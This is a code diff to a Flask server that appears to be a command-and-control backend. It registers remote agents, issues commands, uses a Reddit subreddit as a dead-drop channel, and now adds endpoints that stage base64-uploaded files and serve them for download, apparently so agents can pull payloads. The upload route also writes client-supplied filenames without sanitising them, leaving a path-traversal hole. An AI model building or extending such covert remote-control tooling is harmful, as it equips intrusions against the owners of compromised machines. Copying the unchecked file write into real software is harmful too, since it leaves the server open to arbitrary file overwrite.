@@ -1,7 +1,7 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, send_from_directory
 from datetime import datetime, timezone
 from threading import Thread
-import time, json, praw, requests, base64
+import time, json, praw, requests, base64,os
 
 from models import db, Agent, Command, ProcessedPost
 
@@ -15,6 +15,8 @@ SERVER_PORT = cfg.get("server_port", 5555)
 CRYPTO_KEY = cfg.get("crypto_key", "secret")
 SUBREDDIT = cfg.get("subreddit", "taskdropbox")
 
+STAGING_DIR = "staged_files"
+os.makedirs(STAGING_DIR, exist_ok=True)
 
 app = Flask(__name__)
 app.config["SQLALCHEMY_DATABASE_URI"] = DB_URI
@@ -26,6 +28,38 @@ with app.app_context():
     db.create_all()
 
 
+@app.route("/stage_file", methods=["POST"])
+def stage_file():
+    data = request.get_json()
+    filename = data.get("filename")
+    file_data = data.get("file_data")
+
+    if not filename or not file_data:
+        return jsonify({"error": "filename and file_data required"}), 400
+
+    try:
+        # Decode Base64 back into raw bytes
+        raw_bytes = base64.b64decode(file_data)
+
+        file_path = os.path.join(STAGING_DIR, filename)
+        with open(file_path, "wb") as f:
+            f.write(raw_bytes)
+
+        return jsonify({
+            "status": "staged",
+            "filename": filename,
+            "path": file_path
+        }), 200
+
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+    
+@app.route("/files/<filename>", methods=["GET"])
+def get_staged_file(filename):
+    try:
+        return send_from_directory(STAGING_DIR, filename, as_attachment=False)
+    except Exception as e:
+        return jsonify({"error": f"File not found: {e}"}), 404
 
 @app.route("/register", methods=["POST"])
 def register():
@@ -132,6 +166,8 @@ def mark_processed():
         db.session.commit()
 
     return jsonify({"status": "ok", "post_id": post_id})
+
+
 
 
 @app.route("/processed/<post_id>", methods=["GET"])
